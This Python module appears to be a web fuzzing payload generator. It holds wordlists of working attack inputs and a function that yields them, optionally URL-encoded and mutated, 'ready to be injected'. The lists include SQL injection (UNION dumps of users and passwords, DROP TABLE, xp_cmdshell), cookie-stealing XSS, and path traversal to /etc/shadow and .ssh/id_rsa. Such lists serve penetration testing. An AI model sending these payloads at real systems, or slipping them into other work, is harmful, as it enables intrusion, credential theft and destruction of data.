
import random
import string
import urllib.parse
from dataclasses import dataclass
from typing import Iterator


# ─────────────────────────────────────────────────────────────────────────────
# Payload record
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Payload:
    category: str   # e.g. "SQL Injection"
    raw:      str   # un-encoded original
    encoded:  str   # what actually gets sent


# ─────────────────────────────────────────────────────────────────────────────
# Wordlists – curated like SecLists / wfuzz payloads
# ─────────────────────────────────────────────────────────────────────────────

_SQL_INJECTION = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "' OR 1=1#",
    "') OR ('1'='1",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT username,password FROM users --",
    "1; DROP TABLE users --",
    "1' AND SLEEP(5) --",
    "admin'--",
    "' OR EXISTS(SELECT * FROM users) --",
    "1 OR 1=1",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --",
    "'; EXEC xp_cmdshell('whoami') --",
    "' OR 'unusual'='unusual",
    "1' ORDER BY 1 --",
    "1' ORDER BY 100 --",
]

_XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(document.cookie)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "\" onmouseover=\"alert(1)\"",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
    "{{7*7}}",
    "${alert(1)}",
    "';alert(String.fromCharCode(88,83,83))//",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

_PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow",
    "../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd%00.jpg",
    "../../boot.ini",
    "../../../../../windows/system32/drivers/etc/hosts",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "file:///etc/passwd",
    "../.ssh/id_rsa",
    "/var/log/apache2/access.log",
]

_LONG_INPUTS = [
    "A" * 100,
    "A" * 500,
    "A" * 1000,
    "A" * 4096,
    "%s" * 50,
    "\x00" * 50,
    "1" * 256,
    " " * 200,
    "." * 300,
    "\r\n" * 30,
]

_SPECIAL_CHARS = [
    "'", '"', ";", "--", "#", "/**/", "||", "&&", "|", "`",
    "<>", "\\", "%00", "%0a", "%0d%0a", "&#x27;", "&amp;",
    "\u200b", "\ufeff",
]

# ─────────────────────────────────────────────────────────────────────────────
# Category registry – maps name → (list, display_colour_hint)
# ─────────────────────────────────────────────────────────────────────────────

CATEGORIES: dict[str, list[str]] = {
    "SQL Injection":     _SQL_INJECTION,
    "XSS":               _XSS,
    "Path Traversal":    _PATH_TRAVERSAL,
    "Long Inputs":       _LONG_INPUTS,
    "Special Characters": _SPECIAL_CHARS,
}


# ─────────────────────────────────────────────────────────────────────────────
# Random input generator
# ─────────────────────────────────────────────────────────────────────────────

def _random_strings(count: int = 5, min_len: int = 8, max_len: int = 32) -> list[str]:
    alpha = string.ascii_letters + string.digits
    return [
        "".join(random.choices(alpha, k=random.randint(min_len, max_len)))
        for _ in range(count)
    ]


# ─────────────────────────────────────────────────────────────────────────────
# Mutation helpers
# ─────────────────────────────────────────────────────────────────────────────

def _mutate(base: str, prefix: str = "", suffix: str = "",
            case_var: bool = False, append_nums: bool = False) -> list[str]:
    variants = [base]
    if prefix or suffix:
        variants.append(f"{prefix}{base}{suffix}")
    if case_var and base.upper() != base:
        variants.append(base.upper())
    if append_nums:
        variants.append(f"{base}{random.randint(1, 9999)}")
    return variants


# ─────────────────────────────────────────────────────────────────────────────
# Public generator
# ─────────────────────────────────────────────────────────────────────────────

def generate_payloads(
    categories:      list[str] | None = None,   # None = all
    url_encode:      bool = False,
    enable_mutations: bool = False,
    mutation_prefix:  str = "",
    mutation_suffix:  str = "",
    random_count:    int = 5,
    max_per_category: int = 0,                   # 0 = unlimited
) -> Iterator[Payload]:
    """
    Yield Payload objects ready to be injected.
    Order: SQL → XSS → Path → Long → Special → Random
    """
    enabled = categories or list(CATEGORIES.keys()) + ["Random Inputs"]

    for cat_name in enabled:
        if cat_name == "Random Inputs":
            wordlist = _random_strings(random_count)
        else:
            wordlist = CATEGORIES.get(cat_name, [])

        if max_per_category:
            wordlist = wordlist[:max_per_category]

        for base in wordlist:
            if enable_mutations:
                variants = _mutate(base, mutation_prefix, mutation_suffix,
                                   case_var=True, append_nums=False)
            else:
                variants = [base]

            for v in variants:
                enc = urllib.parse.quote(v, safe="") if url_encode else v
                yield Payload(category=cat_name, raw=v, encoded=enc)
